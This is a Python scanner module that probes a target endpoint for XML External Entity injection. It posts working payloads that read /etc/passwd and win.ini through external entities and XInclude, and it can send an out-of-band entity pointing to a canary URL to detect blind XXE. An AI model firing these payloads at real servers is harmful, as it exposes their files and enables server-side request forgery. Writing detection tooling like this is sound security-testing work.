"""XXE (XML External Entity) injection.

Two detection modes:
  * In-band: request a local file (/etc/passwd) via an external entity and match
    its signature in the response (Confirmed).
  * Out-of-band: reference the canary domain via an external/parameter entity; a
    callback confirms blind XXE (needs canary; otherwise this mode is skipped).

Payloads are POSTed with XML content types to the target endpoint.
"""
from __future__ import annotations

import re

from modules.base import BaseModule, ScanContext, register
from core.result import Finding, Severity

UNIX_PASSWD = re.compile(r"root:.*?:0:0:", re.MULTILINE)
WIN_INI = re.compile(r"\[(fonts|extensions|mci extensions|files)\]", re.I)

INBAND_FILE = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
    '<data>&xxe;</data>'
)
INBAND_WIN = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n'
    '<data>&xxe;</data>'
)
XINCLUDE = (
    '<?xml version="1.0"?>\n'
    '<data xmlns:xi="http://www.w3.org/2001/XInclude">'
    '<xi:include parse="text" href="file:///etc/passwd"/></data>'
)


def _oob_payload(url: str) -> str:
    return (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE data [<!ENTITY xxe SYSTEM "{url}">]>\n'
        '<data>&xxe;</data>'
    )


@register
class XXE(BaseModule):
    id = "xxe"
    name = "XXE (XML External Entity)"
    category = "Injection"
    description = "POSTs XXE payloads (in-band file read + OOB canary) to detect external-entity processing."

    def _post_xml(self, ctx: ScanContext, body: str):
        for ctype in ("application/xml", "text/xml"):
            if ctx.should_stop():
                return None
            try:
                r = ctx.paced_request("POST", ctx.target, data=body.encode(),
                                      headers={"Content-Type": ctype})
                if r is not None:
                    yield ctype, r
            except Exception:
                continue

    def run(self, ctx: ScanContext) -> list[Finding]:
        findings: list[Finding] = []

        # 1) In-band file disclosure (Unix /etc/passwd, Windows win.ini, XInclude).
        for body, label, sig, fname in (
            (INBAND_FILE, "external entity", UNIX_PASSWD, "/etc/passwd"),
            (INBAND_WIN, "external entity (Windows)", WIN_INI, "c:/windows/win.ini"),
            (XINCLUDE, "XInclude", UNIX_PASSWD, "/etc/passwd"),
        ):
            if ctx.should_stop():
                break
            for ctype, r in self._post_xml(ctx, body):
                if sig.search(r.text or ""):
                    findings.append(Finding(
                        module_id=self.id, title=f"XXE file disclosure ({label})",
                        severity=Severity.HIGH, url=ctx.target, confidence="Confirmed",
                        description="An XML external entity read a local file, exposing filesystem contents "
                                    "(and enabling SSRF / potential RCE).",
                        evidence=f"Content-Type {ctype}: {fname} signature returned.",
                        request=f"POST {ctx.target}  (Content-Type: {ctype})",
                        remediation="Disable DTDs/external entities in the XML parser (FEATURE_SECURE_PROCESSING)."))
                    return findings  # confirmed; stop

        # 2) Out-of-band (needs canary).
        oob = ctx.oob
        if oob is not None and oob.enabled and not ctx.should_stop():
            token = oob.new_token("xxe")
            for ctype, r in self._post_xml(ctx, _oob_payload(oob.payload_url(token))):
                pass
            if oob.poll_url and oob.check(token):
                findings.append(Finding(
                    module_id=self.id, title="Blind XXE confirmed via OOB callback",
                    severity=Severity.HIGH, url=ctx.target, confidence="Confirmed",
                    description="A blind XXE external entity triggered a callback to the canary domain.",
                    evidence=f"Canary token {token} ({oob.host(token)})",
                    remediation="Disable external entity resolution in the XML parser."))
            elif not oob.poll_url:
                findings.append(Finding(
                    module_id=self.id, title="XXE OOB payload sent — verify canary logs",
                    severity=Severity.INFO, url=ctx.target, confidence="Tentative",
                    description="Blind XXE payload sent to the canary; check its logs for a callback.",
                    evidence=f"Token {token} ({oob.host(token)})",
                    remediation="Configure an OOB poll URL for auto-confirmation."))
        else:
            ctx.log("    (OOB canary not set — blind XXE mode skipped; in-band only)")
        return findings
